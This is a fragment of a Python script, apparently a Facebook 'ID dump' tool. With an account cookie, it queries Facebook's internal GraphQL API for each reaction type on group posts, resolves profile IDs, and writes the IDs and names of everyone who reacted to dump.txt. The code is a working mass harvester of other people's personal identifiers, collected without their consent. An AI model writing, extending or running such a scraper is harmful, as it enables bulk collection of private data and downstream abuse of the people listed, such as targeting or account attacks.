                            print('%s|%s'%(ray['id'],ray['name']))
                            open('dump.txt','a+').write('%s|%s\n'%(ray['id'],ray['name']))
                            self.dump += 1
                except Exception as e: pass
        except Exception as e: pass
    #--> Get ID From Who Reacted On Each Post In Group
    def ScrapReact(self,fbid):
        for react in ["1635855486666999","1678524932434102","115940658764963","478547315650144","908563459236466","444813342392137","613557422527858"]:
            try:
                dtp = self.data_post.copy()
                dtp.update({'fb_api_req_friendly_name':'CometUFIReactionIconTooltipContentQuery','variables':json.dumps({"feedbackTargetID":fbid,"reactionID":react}),'doc_id':'6235145276554312'})
                pos = self.xyz.post('https://www.facebook.com/api/graphql/',data=dtp,cookies={'cookie':self.cookie}).json()
                for p in pos['data']['feedback']['reactors']['nodes']:
                    try:
                        ray = {'id':self.ConvertID(p['id']),'name':p['name']}
                        if 'pfbid' in ray['id']: pass
                        else:
                            if ray in self.result: pass
                            else:
                                self.result.append(ray)
                                print('%s|%s'%(ray['id'],ray['name']))
                                open('dump.txt','a+').write('%s|%s\n'%(ray['id'],ray['name']))
                                self.dump += 1
                    except Exception as e: pass
            except Exception as e: pass
    #--> Convert PFBID To ID
    def ConvertID(self,id):
        try:
            r = requests.Session()
            q = r.get(f'https://web.facebook.com/{id}',headers=self.head,allow_redirects=True).text
            return(re.search('"userID":"(.*?)"',str(q)).group(1))
        except Exception as e: return(id)

        
if __name__ == '__main__':
    mod()
    menu()
